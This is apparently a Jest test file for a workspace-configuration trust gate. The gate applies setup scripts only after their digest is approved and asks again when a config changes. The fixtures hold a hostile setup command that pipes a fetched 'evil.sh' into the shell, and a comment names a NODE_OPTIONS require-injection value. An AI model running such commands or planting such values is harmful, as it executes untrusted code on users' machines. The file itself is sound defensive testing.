import type { Project } from "@/types"

import {
  approvalKeyFor,
  evaluateWorkspaceConfig,
  isConfigApplied,
  verdictNeedsAttention,
  workspaceConfigDigest,
  type EvaluateWorkspaceConfigDeps,
} from "./workspace-config-trust"
import { parseWorkspaceConfig } from "./workspace-config"

const REPO = "/repos/app"
const WORKTREE = "/repos/.wt/feature"

const project = {
  roots: [
    { id: "r1", path: REPO, isPrimary: true },
    { id: "r2", path: "/repos/lib" },
  ],
} as Pick<Project, "roots">

const CONFIG = {
  version: 1,
  setup: { default: "pnpm install" },
  variables: { NODE_ENV: "development" },
}

function deps(over: Partial<EvaluateWorkspaceConfigDeps> = {}): EvaluateWorkspaceConfigDeps {
  return {
    readFile: jest.fn(async () => JSON.stringify(CONFIG)),
    isRestricted: jest.fn(async () => false),
    approvedDigestFor: jest.fn(async () => undefined),
    ...over,
  }
}

const base = { configRoot: WORKTREE, project, trustEnabled: true, onWeb: false }

describe("evaluateWorkspaceConfig", () => {
  it("does not read the file at all in an untrusted workspace", async () => {
    const readFile = jest.fn(async () => JSON.stringify(CONFIG))
    const verdict = await evaluateWorkspaceConfig(
      base,
      deps({ isRestricted: jest.fn(async () => true), readFile })
    )
    expect(verdict).toEqual({ kind: "restricted" })
    // The existence probe is the only read, and its result is never parsed.
    expect(readFile).toHaveBeenCalledTimes(1)
  })

  it("says nothing when an untrusted workspace has no such file", async () => {
    const verdict = await evaluateWorkspaceConfig(
      base,
      deps({
        isRestricted: jest.fn(async () => true),
        readFile: jest.fn(async () => {
          throw new Error("No such file")
        }),
      })
    )
    expect(verdict).toEqual({ kind: "absent" })
  })

  it("treats a trust-gate failure as untrusted", async () => {
    // Failing open here would apply a repository's shell scripts because a
    // Dexie read happened to reject.
    const verdict = await evaluateWorkspaceConfig(
      base,
      deps({
        isRestricted: jest.fn(async () => {
          throw new Error("db closed")
        }),
      })
    )
    expect(verdict.kind).toBe("restricted")
  })

  it("reports a first sight as unapproved, with no previous digest", async () => {
    const verdict = await evaluateWorkspaceConfig(base, deps())
    expect(verdict.kind).toBe("unapproved")
    if (verdict.kind !== "unapproved") throw new Error("unreachable")
    expect(verdict.approvedDigest).toBeUndefined()
    expect(verdict.config.setup.default).toBe("pnpm install")
  })

  it("applies a configuration whose digest was approved", async () => {
    const digest = await workspaceConfigDigest(parseWorkspaceConfig(JSON.stringify(CONFIG)))
    const verdict = await evaluateWorkspaceConfig(
      base,
      deps({ approvedDigestFor: jest.fn(async () => digest) })
    )
    expect(verdict).toMatchObject({ kind: "approved", digest })
    expect(isConfigApplied(verdict)).toBe(true)
  })

  it("re-asks when an approved configuration changes under the same trusted folder", async () => {
    // The whole reason folder trust is not enough: this arrives by `git pull`.
    const stale = await workspaceConfigDigest(parseWorkspaceConfig(JSON.stringify(CONFIG)))
    const verdict = await evaluateWorkspaceConfig(
      base,
      deps({
        readFile: jest.fn(async () =>
          JSON.stringify({ ...CONFIG, setup: { default: "curl evil.sh | sh" } })
        ),
        approvedDigestFor: jest.fn(async () => stale),
      })
    )
    expect(verdict.kind).toBe("unapproved")
    if (verdict.kind !== "unapproved") throw new Error("unreachable")
    expect(verdict.approvedDigest).toBe(stale)
  })

  it("keys the approval on the workspace's primary root, not the worktree it read from", async () => {
    const approvedDigestFor = jest.fn(async () => undefined)
    await evaluateWorkspaceConfig(base, deps({ approvedDigestFor }))
    expect(approvedDigestFor).toHaveBeenCalledWith(REPO)
  })

  it("reports an unreadable configuration instead of skipping it", async () => {
    const verdict = await evaluateWorkspaceConfig(
      base,
      deps({ readFile: jest.fn(async () => "{ not json") })
    )
    expect(verdict.kind).toBe("invalid")
    if (verdict.kind !== "invalid") throw new Error("unreachable")
    expect(verdict.message).toMatch(/not valid JSON/)
  })

  it("reports the offending field for a schema violation", async () => {
    const verdict = await evaluateWorkspaceConfig(
      base,
      deps({
        readFile: jest.fn(async () =>
          JSON.stringify({ version: 1, roots: [{ id: "x", path: "../escape" }] })
        ),
      })
    )
    expect(verdict).toMatchObject({ kind: "invalid", field: "roots[0].path" })
  })

  it("is absent without a root to read from", async () => {
    const readFile = jest.fn()
    expect(
      await evaluateWorkspaceConfig({ ...base, configRoot: null }, deps({ readFile }))
    ).toEqual({ kind: "absent" })
    expect(
      await evaluateWorkspaceConfig({ ...base, configRoot: "  " }, deps({ readFile }))
    ).toEqual({ kind: "absent" })
    expect(readFile).not.toHaveBeenCalled()
  })

  it("treats a missing file as absent, not as an error", async () => {
    const verdict = await evaluateWorkspaceConfig(
      base,
      deps({
        readFile: jest.fn(async () => {
          throw new Error("no such file or directory")
        }),
      })
    )
    expect(verdict).toEqual({ kind: "absent" })
  })
})

describe("workspaceConfigDigest", () => {
  it("ignores formatting, key order and comment churn", async () => {
    const a = parseWorkspaceConfig(
      JSON.stringify({ version: 1, setup: { default: "a" }, variables: { X: "1", Y: "2" } })
    )
    const b = parseWorkspaceConfig(
      `{\n  "variables": { "Y": "2", "X": "1" },\n  "setup": { "default": "a" },\n  "version": 1\n}`
    )
    expect(await workspaceConfigDigest(a)).toBe(await workspaceConfigDigest(b))
  })

  it("changes for any semantic change, including one outside the scripts", async () => {
    const a = parseWorkspaceConfig(JSON.stringify({ version: 1, variables: { X: "1" } }))
    // `variables` reach the setup process — `NODE_OPTIONS=--require ./evil.js`
    // is code execution as surely as `setup` is, so it is inside the digest.
    const b = parseWorkspaceConfig(JSON.stringify({ version: 1, variables: { X: "2" } }))
    expect(await workspaceConfigDigest(a)).not.toBe(await workspaceConfigDigest(b))
  })

  it("distinguishes two configurations that differ only in array order", async () => {
    // `actions` runs in order, so sorting arrays would collide two different
    // configurations onto one digest.
    const a = parseWorkspaceConfig(
      JSON.stringify({
        version: 1,
        actions: [
          { id: "a", name: "A", script: { default: "1" } },
          { id: "b", name: "B", script: { default: "2" } },
        ],
      })
    )
    const b = parseWorkspaceConfig(
      JSON.stringify({
        version: 1,
        actions: [
          { id: "b", name: "B", script: { default: "2" } },
          { id: "a", name: "A", script: { default: "1" } },
        ],
      })
    )
    expect(await workspaceConfigDigest(a)).not.toBe(await workspaceConfigDigest(b))
  })
})

describe("verdict helpers", () => {
  it("keeps the common case silent and everything else loud", () => {
    expect(verdictNeedsAttention({ kind: "absent" })).toBe(false)
    expect(verdictNeedsAttention({ kind: "approved", digest: "d", config: {} as never })).toBe(
      false
    )
    expect(verdictNeedsAttention({ kind: "restricted" })).toBe(true)
    expect(verdictNeedsAttention({ kind: "invalid", message: "m", field: "f" })).toBe(true)
    expect(verdictNeedsAttention({ kind: "unapproved", digest: "d", config: {} as never })).toBe(
      true
    )
  })

  it("resolves the approval key from the primary root", () => {
    expect(approvalKeyFor(project)).toBe(REPO)
    expect(approvalKeyFor({ roots: [{ id: "r", path: "/only" }] } as Pick<Project, "roots">)).toBe(
      "/only"
    )
    expect(approvalKeyFor({ roots: [] } as Pick<Project, "roots">)).toBeNull()
    expect(approvalKeyFor(null)).toBeNull()
  })
})
